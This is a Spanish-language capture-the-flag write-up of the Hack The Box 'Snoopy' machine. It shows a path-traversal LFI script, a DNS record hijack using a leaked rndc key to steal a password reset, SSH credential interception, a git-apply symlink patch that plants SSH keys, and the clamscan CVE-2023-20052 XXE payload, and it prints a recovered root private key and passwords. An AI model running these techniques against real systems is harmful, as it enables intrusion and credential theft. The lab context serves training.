---
layout: post
title: Snoopy
date: 2023-09-23
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Snoopy-htb/Snoopy.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.212 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 17:26 GMT
Nmap scan report for 10.10.11.212
Host is up (0.064s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,53,80 10.10.11.212 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 17:26 GMT
Nmap scan report for 10.10.11.212
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.97 seconds
```

## Puerto 80

Con ```whatweb```, analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.212
http://10.10.11.212 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@snoopy.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.212], Lightbox, Script, Title[SnoopySec Bootstrap Template - Index], nginx[1.18.0]
```

Agrego el dominio ```snoopy.htb``` al ```/etc/hosts```

La página principal se ve así:

<img src="/writeups/assets/img/Snoopy-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.212/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.212/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000347:   301        7 L      12 W       178 Ch      "forms"                                                                                                                                         
000000277:   301        7 L      12 W       178 Ch      "assets"                                                                                                                                        
000000003:   200        43877    431888 W   10771087    "download" 
```

La ruta ```/download``` contiene un zip con un PDF y un video

<img src="/writeups/assets/img/Snoopy-htb/2.png" alt="">

Encuentro un subdominio

```null
wfuzz -c --hh=23418 -t 200 -w /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.snoopy.htb" http://snoopy.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://snoopy.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000582:   200        0 L      141 W      3132 Ch     "mm"                                                                                                                                            

Total time: 15.28893
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 326.3143
```

<img src="/writeups/assets/img/Snoopy-htb/3.png" alt="">

No dispongo de credenciales, por lo que lo dejo de lado por ahora. En el código de fuente de ```snoopy.htb``` se puede ver que la ruta ```/download``` dispone de un parámetro ```?file```

<img src="/writeups/assets/img/Snoopy-htb/4.png" alt="">

Es vulnerable a LFI a través de un Directory Path Traversal con ```....//```, ya que se está empleando la funcion en PHP ```str_replace()``` que en caso de detectar ```../``` elimina la cadena. Creo un pequeño script en ```bash``` para poder operar más comodamente, ya que el archivo obtenido se encuentra comprimido en un ZIP

```null
#!/bin/bash

main_url="http://snoopy.htb/download?file=/....//....//....//....//....//....//....//....//....//....//....//..../"
file="$1"

curl -s -X GET "${main_url}${file}" -o file.zip
unzip -q file.zip

cat "press_package/$file"
rm -rf file.zip press_package
```

```null
./lfi.sh /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

En la sección de Contacto, dan una pista diciendo que se están migrando los DNS. El archivo de configuración típico es ```/etc/bind/named.conf```

```null
./lfi.sh /etc/bind/named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

Esta clave es importante, ya que permite modificar los DNS Records de forma remota. Había visto un ```mattermost``` en ```mm.snoopy.htb```. Puedo intentar cambiar la contraseña de un usuario haciendo que el correo se envíe a mí

```null
nsupdate -k key
> server 10.10.11.212
> zone snoopy.htb
> update add mail.snoopy.htb 30 IN A 10.10.16.40
> send
```

Me pongo en escucha con un servicio ```smtpd``` con ```python```

```null
python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25 2>/dev/null
```

Envío un correo para el usuario ```cbrown```

<img src="/writeups/assets/img/Snoopy-htb/5.png" alt="">

A el enlace recibido es importante eliminar el ```3D``` y ```=``` para que sea válido, corresponde al URL Encode. Lo abro en el navegado y modifico la contraseña

<img src="/writeups/assets/img/Snoopy-htb/6.png" alt="">

Me puedo loggear

<img src="/writeups/assets/img/Snoopy-htb/7.png" alt="">

Introduciendo en el chat una ```/```, se pueden ver todos los comandos del bot disponibles. Uno de ellos, es ```/server_provision```, el cual permite enviar una conexión

<img src="/writeups/assets/img/Snoopy-htb/8.png" alt="">

Me quedo en escucha por ```netcat``` y en base a la cabecera puedo ver que se trata de SSH

```null
nc -nlvp 2222
listening on [any] 2222 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.212] 47282
SSH-2.0-paramiko_3.1.0
```

Con ```ssh-mint``` puedo obtener las credenciales de ```cbrown```

```null
python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222
────────────────────────────────────────────────────────────────────────────────────── SSH-MITM - ssh audits made simple ───────────────────────────────────────────────────────────────────────────────────────
Version: 3.0.2
License: GNU General Public License v3.0
Documentation: https://docs.ssh-mitm.at
Issues: https://github.com/ssh-mitm/ssh-mitm/issues
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
generated temporary RSAKey key with 2048 bit length and fingerprints:
   MD5:96:44:66:51:ee:d4:39:cb:b0:76:10:b0:63:dc:a6:6c
   SHA256:3an6AgOqdumLHXTZB45rJ+bP4DIStQEumOt7fFbqmaE
   SHA512:nbwRqONElLagTYyvSdjER+qEV6TitTG/AeVHpPfXdSvdCRbrPOlbuKAuIAbMnhg8FcCBvojIW0J8iuXonKA9bQ
listen interfaces 0.0.0.0 and :: on port 2222
─────────────────────────────────────────────────────────────────────────────────────────── waiting for connections ────────────────────────────────────────────────────────────────────────────────────────────
[05/25/23 11:17:08] INFO     ℹ session 8d7f7978-8d1b-431d-9f4c-a8d589ae031e created                                                                                                              
                    INFO     ℹ client information:                                                                                                                                                
                               - client version: ssh-2.0-paramiko_3.1.0                                                                                                                           
                               - product name: Paramiko                                                                                                                                                         
                               - vendor url:  https://www.paramiko.org/                                                                                                                                         
                             ⚠ client audit tests:                                                                                                                                                   
                               * client uses same server_host_key_algorithms list for unknown and known hosts                                                                                                
                               * Preferred server host key algorithm: ssh-ed25519                                                                                                                               
[05/25/23 11:17:10] INFO     Remote authentication succeeded                                                                                                                                      
                                     Remote Address: 10.10.11.212:22                                                                                                                                            
                                     Username: cbrown                                                                                                                                                           
                                     Password: sn00pedcr3dential!!!                                                                                                                                             
                                     Agent: no agent                                                                                                                                                            
                    INFO     ℹ 8d7f7978-8d1b-431d-9f4c-a8d589ae031e - local port forwading                                                                                                       
                             SOCKS port: 39633                                                                                                                                             
                               SOCKS4:                                                                                                                                                                    
                                 * socat: socat TCP-LISTEN:LISTEN_PORT,fork socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,socksport=39633                                                   
                                 * netcat: nc -X 4 -x localhost:39633 address port                                                                                                               
                               SOCKS5:                                                                                                                                                                    
                                 * netcat: nc -X 5 -x localhost:39633 address port                                                                                                               
                    INFO     got ssh command: ls -la                                                                                                                                                            
[05/25/23 11:17:11] INFO     ℹ 8d7f7978-8d1b-431d-9f4c-a8d589ae031e - session started                                                                                                            
                    INFO     got remote command: ls -la                                                                                                                                                         
[05/25/23 11:17:12] INFO     remote command 'ls -la' exited with code: 0                                                                                                                                        
                    ERROR    Socket exception: Connection reset by peer (104)                                                                                                                                   
                    INFO     ℹ session 8d7f7978-8d1b-431d-9f4c-a8d589ae031e closed
```

Me conecto a la máquina

```null
sshpass -p 'sn00pedcr3dential!!!' ssh cbrown@10.10.11.212
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu May 25 10:37:46 2023 from 10.10.16.18
cbrown@snoopy:~$        
```

Tengo un privilegio a nivel de ```sudoers```

```null
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

Busco por una forma de abusar de esto

<img src="/writeups/assets/img/Snoopy-htb/9.png" alt="">

A la hora de hacer un commit, puedo añadir una tarea para copiar mi clave pública como ```authorized_keys``` para ```sbrown```. Creo un repositorio

```null
cbrown@snoopy:/tmp$ mkdir git
cbrown@snoopy:/tmp$ cd !$
cd git
cbrown@snoopy:/tmp/git$ git init
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint: 	git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint: 	git branch -m <name>
Initialized empty Git repository in /tmp/git/.git/
cbrown@snoopy:/tmp/git$ git config --global init.defaultBranch master
```

Necesito un enlace simbólico que apunte al directorio ```ssh``` del usuario ```sbrown```

```null
cbrown@snoopy:/tmp/git$ ln -s /home/sbrown/.ssh/ symlink
```

Creo el primer commit con los archivos existentes

```null
cbrown@snoopy:/tmp/git$ git commit -m "First commit"
[master (root-commit) 1238e75] First commit
 Committer: Charlie Brown <cbrown@snoopy.htb>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly:

    git config --global user.name "Your Name"
    git config --global user.email you@example.com

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 1 insertion(+)
 create mode 120000 symlink
```

Añado el usuario y mail en la configuración

```null
cbrown@snoopy:/tmp/git$ git config --global user.name "cbrown"
cbrown@snoopy:/tmp/git$ git config --global user.email cbrown@snoopy.htb
```

Le cambio el nombre al enlace simbólico para que sea distinto en el nuevo commit

```null
cbrown@snoopy:/tmp/git$ mv symlink renamed-symlink
```

Añado un archivo de prueba

```null
cbrown@snoopy:/tmp/git$ echo test > test
```

Y creo el nuevo commit

```null
cbrown@snoopy:/tmp/git$ git add .
cbrown@snoopy:/tmp/git$ git commit -m "Renamed symlink"
[master 0101a85] Renamed symlink
 2 files changed, 1 insertion(+)
 rename symlink => renamed-symlink (100%)
 create mode 100644 test
```

Listo los commits existentes

```null
cbrown@snoopy:/tmp/git$ git log
commit 0101a85fb4a90663c0fe383c3a361b9dee1370bc (HEAD -> master)
Author: cbrown <cbrown@snoopy.htb>
Date:   Sat Sep 23 16:33:23 2023 +0000

    Renamed symlink

commit 4ed098121d01af2330aa110300dc5fd9c32d53b9
Author: cbrown <cbrown@snoopy.htb>
Date:   Sat Sep 23 16:32:29 2023 +0000

    First commit
```

Hago un diff para mostrar los cambios

```null
cbrown@snoopy:/tmp/git$ git diff 4ed098121d01af2330aa110300dc5fd9c32d53b9
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
diff --git a/test b/test
new file mode 100644
index 0000000..9daeafb
--- /dev/null
+++ b/test
@@ -0,0 +1 @@
+test
```

A partir de este creo un ```patch```. Modifico la ruta final para que la ruta final sea el ```authorized_keys```. Como permiso le añado el 600 (Filemode 100600)

```sh
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git a/authorized_keys b/renamed-symlink/authorized_keys
new file mode 100600
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCp0R1sK3kRw1o0/Yc3UXmXe7o9D3CXvyQQpr8zBniI/2Acss37cpKBtjyK+IhX/Nt0IMxnv5w5bRKXL2R5f3NlNXyU+wXP6qLcPgbUPQx9TBbtVPulgt3sbIc6pq19e8sn+gQSrBqxaEcuvzHwMltSEuaqRweazn48U2vePYjsdDSR9058CMQvVeVXn/kri3ozS3I1HdGSmLkMSFPF8FNi9Cm7N3s7mZZ358/ZjrkRbOauwotOAZwYTfi57gcjUjeYP1OTCjBOkc1oN6Bdo5Zo1E4V+oLcZCW3RtmVD0faHxoiVI+3Ow9LXaNKJL/SBXr2z+s9cWqq5Uc6LGRiGK26TdWsasd5P2otEkYRxPhKkEHkH2AsjFo4aFSU8ZpFSWHlvPHcr9Isk5G5X5XIo7rRxOYJ+GkHY6MgBNN5bpsSEbAds4K19GLoCgIdtyV3677jHmcNBMM01CbXyAZw9OCT7kbbQvCvvmoK5SrWk6xn19vBA95O4zH6Oq280AoYj8E= root@kali
```

Aplico los cambios

```null
cbrown@snoopy:/tmp/git$ sudo -u sbrown /usr/bin/git apply -v patch 
Checking patch symlink => renamed-symlink...
Checking patch renamed-symlink/authorized_keys...
Applied patch symlink => renamed-symlink cleanly.
Applied patch renamed-symlink/authorized_keys cleanly.
```

Gano acceso al sistema como el usuario ```sbrown```. Puedo ver la primera flag

```null
ssh sbrown@10.10.11.212
The authenticity of host '10.10.11.212 (10.10.11.212)' can't be established.
ED25519 key fingerprint is SHA256:XCYXaxdk/Kqjbrpe8gktW9N6/6egnc+Dy9V6SiBp4XY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.212' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

sbrown@snoopy:~$ cat user.txt 
cde09c544776a81dd671b85829173be5
```

# Escalada

Tengo otro privilegio a nivel de sudoers

```null
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```

Busco exploits públicos para ```clamscan```

<img src="/writeups/assets/img/Snoopy-htb/10.png" alt="">

Es vulnerable a ```Arbitrary File Read```. Se trata del [CVE-2023-20052](https://github.com/nokn0wthing/CVE-2023-20052). Descargo un exploit que me genera un archivo que tengo que transferir para escanearlo

```null
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
cd CVE-2023-20052
sudo docker build -t cve-2023-20052 .
sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash
```

En el contenedor, creo el archivo que se exportará a mi equipo real

```null
root@58b923b92242:/exploit# bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

Tras escanearlo, aparecerá la ```id_rsa``` del usuario ```root```

```null
sbrown@snoopy:~/scanfiles$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
...

LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf
hy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSw
kfWsSVrLTh5vf0gaV1ql59Wc8Gh7IKFrEEcLXLqqyDoprKq2ZG06S2foeUWkSY134Uz9oI
Ctqf16lLFi4Lm7t5jkhW9YzDRha7Om5wpxucUjQCG5dU/Ij1BA5jE8G75PALrER/4dIp2U
zrXxs/2Qqi/4TPjFJZ5YyaforTB/nmO3DJawo6bclAA762n9bdkvlxWd14vig54yP7SSXU
tPGvP4VpjyL7NcPeO7Jrf62UVjlmdro5xaHnbuKFevyPHXmSQUE4yU3SdQ9lrepY/eh4eN
y0QJG7QUv8Z49qHnljwMTCcNeH6Dfc786jXguElzAAAFiAOsJ9IDrCfSAAAAB3NzaC1yc2
EAAAGBANeetM1N4+5hUFLOVwxiGq7Yf4jFBeltqILFtCjxTfDH3xMc9hvQ/+IKWIyHMmrj
x0q1eH4zRjOOgIsw00CKCujMjeCvDzc2DGlZweiDBvQFbYRLtdZ2M6Kh5gX4ctHKeBGjN4
CE2tdADAQG579m0MloVWWkJUkORwx7dA8NZlgbnuXmsXrqlt0WCRoyo7hUsJH1rElay04e
b39IGldapefVnPBoeyChaxBHC1y6qsg6KayqtmRtOktn6HlFpEmNd+FM/aCAran9epSxYu
C5u7eY5IVvWMw0YWuzpucKcbnFI0AhuXVPyI9QQOYxPBu+TwC6xEf+HSKdlM618bP9kKov
+Ez4xSWeWMmn6K0wf55jtwyWsKOm3JQAO+tp/W3ZL5cVndeL4oOeMj+0kl1LTxrz+FaY8i
+zXD3juya3+tlFY5Zna6OcWh527ihXr8jx15kkFBOMlN0nUPZa3qWP3oeHjctECRu0FL/G
ePah55Y8DEwnDXh+g33O/Oo14LhJcwAAAAMBAAEAAAGABnmNlFyya4Ygk1v+4TBQ/M8jhU
flVY0lckfdkR0t6f0Whcxo14z/IhqNbirhKLSOV3/7jk6b3RB6a7ObpGSAz1zVJdob6tyE
ouU/HWxR2SIQl9huLXJ/OnMCJUvApuwdjuoH0KQsrioOMlDCxMyhmGq5pcO4GumC2K0cXx
dX621o6B51VeuVfC4dN9wtbmucocVu1wUS9dWUI45WvCjMspmHjPCWQfSW8nYvsSkp17ln
Zvf5YiqlhX4pTPr6Y/sLgGF04M/mGpqskSdgpxypBhD7mFEkjH7zN/dDoRp9ca4ISeTVvY
YnUIbDETWaL+Isrm2blOY160Z8CSAMWj4z5giV5nLtIvAFoDbaoHvUzrnir57wxmq19Grt
7ObZqpbBhX/GzitstO8EUefG8MlC+CM8jAtAicAtY7WTikLRXGvU93Q/cS0nRq0xFM1OEQ
qb6AQCBNT53rBUZSS/cZwdpP2kuPPby0thpbncG13mMDNspG0ghNMKqJ+KnzTCxumBAAAA
wEIF/p2yZfhqXBZAJ9aUK/TE7u9AmgUvvvrxNIvg57/xwt9yhoEsWcEfMQEWwru7y8oH2e
IAFpy9gH0J2Ue1QzAiJhhbl1uixf+2ogcs4/F6n8SCSIcyXub14YryvyGrNOJ55trBelVL
BMlbbmyjgavc6d6fn2ka6ukFin+OyWTh/gyJ2LN5VJCsQ3M+qopfqDPE3pTr0MueaD4+ch
k5qNOTkGsn60KRGY8kjKhTrN3O9WSVGMGF171J9xvX6m7iDQAAAMEA/c6AGETCQnB3AZpy
2cHu6aN0sn6Vl+tqoUBWhOlOAr7O9UrczR1nN4vo0TMW/VEmkhDgU56nHmzd0rKaugvTRl
b9MNQg/YZmrZBnHmUBCvbCzq/4tj45MuHq2bUMIaUKpkRGY1cv1BH+06NV0irTSue/r64U
+WJyKyl4k+oqCPCAgl4rRQiLftKebRAgY7+uMhFCo63W5NRApcdO+s0m7lArpj2rVB1oLv
dydq+68CXtKu5WrP0uB1oDp3BNCSh9AAAAwQDZe7mYQ1hY4WoZ3G0aDJhq1gBOKV2HFPf4
9O15RLXne6qtCNxZpDjt3u7646/aN32v7UVzGV7tw4k/H8PyU819R9GcCR4wydLcB4bY4b
NQ/nYgjSvIiFRnP1AM7EiGbNhrchUelRq0RDugm4hwCy6fXt0rGy27bR+ucHi1W+njba6e
SN/sjHa19HkZJeLcyGmU34/ESyN6HqFLOXfyGjqTldwVVutrE/Mvkm3ii/0GqDkqW3PwgW
atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA==
-----END OPENSSH PRIVATE KEY-----

LibClamAV debug: cli_scandmg: wanted blkx, text value is cSum
LibClamAV debug: cli_scandmg: wanted blkx, text value is nsiz
LibClamAV debug: cli_scandmg: wanted blkx, text value is plst
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: in cli_scanscript()
LibClamAV debug: matcher_run: performing regex matching on full map: 0+45581(45581) >= 45581
LibClamAV debug: matcher_run: performing regex matching on full map: 0+45581(45581) >= 45581
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: cli_magic_scan: returning 0  at line 4997
LibClamAV debug: clean_cache_add: c0154e3cc0ee5d3b3de026dd32fa95c7 (level 0)
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
/home/sbrown/scanfiles/exploit.dmg: OK
LibClamAV debug: Cleaning up phishcheck
LibClamAV debug: Freeing phishcheck struct
LibClamAV debug: Phishcheck cleaned up

----------- SCAN SUMMARY -----------
Known viruses: 8659055
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 1
Infected files: 0
Data scanned: 0.15 MB
Data read: 0.11 MB (ratio 1.41:1)
Time: 29.537 sec (0 m 29 s)
Start Date: 2023:09:23 17:30:16
End Date:   2023:09:23 17:30:46
```

La copio a mi equipo y me conecto por SSH. Puedo ver la segunda flag

```null
ssh -i id_rsa root@10.10.11.212
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 12 21:28:56 2023 from 10.10.14.46
root@snoopy:~# cat root.txt 
0dff5f1978cf1f5a7b07db9a63685c86
```